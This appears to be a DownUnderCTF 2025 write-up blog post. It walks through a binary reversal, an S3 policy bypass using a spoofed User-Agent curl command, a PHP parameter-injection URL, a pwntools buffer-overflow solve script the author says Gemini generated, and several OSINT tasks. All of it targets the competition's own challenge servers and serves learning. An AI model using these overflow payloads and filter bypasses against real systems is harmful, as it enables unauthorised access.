The flag can be found in an image in the sponsors channel. `DUCTF{E-d0g_th4nks_th3_sp0ns0rs_4_th3ir_supp0rt!}`

### zeus

We can upload the binary on dogbolt.org to decompile it. Looking at the angr output's main function, we can clearly see that the binary expects 2 arguments to be passed.

```c
int main(unsigned int a0, char *a1[3])
{
    unsigned long long v0;  // [bp-0x98]
    unsigned long long v1;  // [bp-0x90]
    ...
    unsigned long long v15;  // [bp-0x10]

    v15 = "To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer our praise, we make you welcome!";
    v14 = "Maimaktes1337";
    ...
    v13 = 0x4e4a5a00;
    if (a0 == 3 && !strcmp(a1[1], "-invocation") && !strcmp(a1[2], "To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer our praise, we make you welcome!"))
    {
        puts("Zeus responds to your invocation!");
        v0 = 873434613382001673;
        v1 = 77988709201106461;
        v2 = 6503512442910555656;
        v3 = 3752071361029364050;
        v4 = 1320500633443699477;
        v5 = v12;
        v6 = 0x4e4a5a00;
        xor(&v0, "Maimaktes1337");
        printf("His reply: %s\n", &v0);
        return 0;
    }
    puts("The northern winds are silent...");
    return 0;
}
```

So we can make the binary executable using `chmod +x zeus`. Then we can run `./zeus '-invocation' 'To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer our praise, we make you welcome!'`

![zeus](/assets/images/ductf/zeus1.png)

Thus we get the flag `DUCTF{king_of_the_olympian_gods_and_god_of_the_sky}`

### kick the bucket

>Dear FireyNacho,
>
>In this challenge, CI/CD pipelines and Terraform are being used to manage AWS resources. Part of this infrastructure utilises an S3 bucket, which is used to stage files and configuration. Being security conscious individuals, the admins have prevented misuse of this bucket by configuring access only to Terraform. They are also using S3 presigned URLs to provide timeboxed access to certain files without sharing credentials.
>
>Given a presigned URL for flag.txt (generated by the CI/CD pipeline user), and the resource policy applied to the S3 bucket, find a way to get at the flag!
>
>If you need a primer on some of the AWS concepts at play here:
>
>>[https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html)
>[https://docs.aws.amazon.com/AmazonS3/latest/userguide/example-bucket-policies.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/example-bucket-policies.html)
>[https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic.html#policy-eval-basics-id-rdp](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic.html#policy-eval-basics-id-rdp)
>
>   Regards,    
>   gyrospectre 

According to the given S3 bucket's resource policy, if we look at the User Agent condition, we can see that the bucket can only be accessed by a user agent starting with `aws-sdk-go`.

```
"Condition": {
    "StringLike": {
        "aws:UserAgent": "aws-sdk-go*"
        }
    }
```

Hence, we can send modified User Agents using `curl`, so sending a command like this can get us access to the S3 bucket's contents.

```
curl "https://kickme-95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXC42U7VJ7MRP6INU%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b" -H "User-Agent: aws-sdk-go/1.44.294"
```

![kick the bucket](/assets/images/ductf/kick_the_bucket1.png)

Thus we get the flag `DUCTF{youtube.com/watch?v=A20QQSZsv4E}`.

### philtered

>Dear FireyNacho,
>
>Can you phigure this one out?

>   AU: https://web-philtered-0a2005e5b9bf.2025.ductf.net  
>   US: https://web-philtered-0a2005e5b9bf.2025-us.ductf.net   

Upon reading the `index.php` file in the source code, we come accross an interesting snippet of code. It is the one performing the sanitization.

```php
public function contains_blacklisted_term($value) {
    if (!$this->allow_unsafe) {
        foreach ($this->blacklist as $term) {
            if (stripos($value, $term) !== false) {
                return true;    
            }
        }
    }
    return false;
}
```

If we set `allow_unsafe` to true, then the whole function is skipped in its entireity. Next we can set `data_folder` as nothing so it gets set to `\` by default giving us access to the `flag.txt` file. Finally, the `path` can be set to `flag.txt` which will make it render on page.

Hence we can visit this url `https://web-philtered-0a2005e5b9bf.2025-us.ductf.net/?allow_unsafe=true&config[data_folder]=&config[path]=flag.php`. Upon visiting we cannot see the flag and instead see a bunch of errors but if we just view the source code using `Ctrl+U`, we get the flag in plain sight.

![alt text](/assets/images/ductf/philtered1.png)

The flag is `DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}`.

### corporate-cliche

>Dear FireyNacho,

>It's time to really push the envelope and go above and beyond! We've got a new challenge for you. Can you find a way to get into our email server?

>   US: nc chal.2025-us.ductf.net 30000

Reading the source code provided, we get that the password is being read by the `gets()` function. This is vulnerable to buffer overflow, but i was a bit bored to do the analysis. Hence I uploaded the chall source to Gemini. Here is the Gemini generated solve script.

```python
from pwn import *

PAYLOAD = (
    b'\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3\x00'+ 
    b'A' * 11+
    b'admin\x00'
)

p = remote("chal.2025.ductf.net", 30000)

p.sendlineafter(b"Enter your username: ", b"guest")
p.sendlineafter(b"Enter your password: ", PAYLOAD)

p.interactive()
```
so we run `python corporate-cliche1.py`.

```
┌──(kali㉿kali)-[~/ctf/ductf]

The flag is `DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}`.

### our lonely dog

>Dear FireyNacho,
>
>e-dog has been alone in the downunderctf.com email server for so long, please yeet him an email of some of your pets to keep him company, he might even share his favourite toy with you.
>
>He has a knack for hiding things one layer deeper than you would expect.
>
>   Regards,   
>   crem   

The text suggests that we send an email to e-dog@downunderctf.com and he will reply with some kind of "toy" which will be essential to find the flag. So I send an email with the following content.

```
Subject: Some pet pictures for you!
Content: Some pet pictures for you!
Attachment: An image of cute [dogs](https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg) I lifted from the internet.
```

I receive a reply almost instantly but I do not get any attachments. The wording of the challenge suggests stegnography so I view the raw email. On Gmail you can do it using the 3 dots and clicking view original. Below is a snippet of the same.

```
Delivered-To: <REDACTED_EMAIL>
Received: by <REDACTED_IP> with SMTP id <REDACTED_ID>;
...
Content-Type: text/plain; charset="UTF-8"
X-FLAG: DUCTF{g00d-luCk-G3tT1nG-ThR0uGh-Al1s-Th3-eM41Ls}

Hi,

E-dog gets quite pupset when they can't find their bone, especially when it's been a ruff day. Maybe we need to pull out a new one for them?
```

Clearly the flag is hidden in one of the headers called `X-FLAG`. The flag is `DUCTF{g00d-luCk-G3tT1nG-ThR0uGh-Al1s-Th3-eM41Ls}`.

### Look at all those chickens!

Reverse searching the image on google, we get a similar match.

![alt text](/assets/images/ductf/laatc1.png)

The place seems to be [Nangak Tamboree Wildlife Sanctuary](https://www.tripadvisor.in/Attraction_Review-g2529773-d23123309-Reviews-Nangak_Tamboree_Wildlife_Sanctuary-Bundoora_Greater_Melbourne_Victoria.html). But it turns out to be a dead end.

The bird in the image definitely dosent look like a chicken, so the chall name should be a hint. After some google searches, i understand that the one in the image is the australian white ibis, and its common name is a bin chicken.

![alt text](/assets/images/ductf/laatc2.png)

So i add some additional search parameters to my search which gets me to a reddit post.

![alt text](/assets/images/ductf/laatc3.png)

This confirms the image is of the bin chicken island.

![alt text](/assets/images/ductf/laatc4.png)

Turns out the original thing about Nangak Tamboree Wildlife Sanctuary, was just beside this bin chicken island. Anyways, if the birds are moved, it should be to a zoo right ? So i search for zoos around this island on maps.

![alt text](/assets/images/ductf/laatc5.png)

I tried all of the different zoos in melbourne but to no luck. Then just look around on maps for something that could fit in. Turns out there is a prison just beside the island. Since the description mentions captivity, i just decide to try it, anything at this point right ?

![alt text](/assets/images/ductf/laatc6.png)

Turns out it was the flag `DUCTF{Pentridge_Prison}`.

### fat donke dis

>Dear FireyNacho,

>ain't no fat donke tryin to spit bars on the fat monke

We search for MC Fat Monke on google, we get a Soundcloud account associated to him.

![SoundCloud Account](/assets/images/ductf/fat_donke_diss1.png)

The latest song he uploaded is called fat donke diss, which is also mentioned in the description, so I decide to probe it further.

![Song Description](/assets/images/ductf/fat_donke_diss2.png)

The song description has a [Youtube Video](https://www.youtube.com/watch?v=dWugaNwXjzI) link.

![Youtube Video](/assets/images/ductf/fat_donke_diss3.png)

Timestamp [0:53](https://youtu.be/dWugaNwXjzI?t=53) of this video has the flag visible on screen

![Flag](/assets/images/ductf/fat_donke_diss4.png)

We get the flag as `DUCTF{I_HAVE_NOT_THOUGHT_UP_OF_A_FLAG_YET}`.
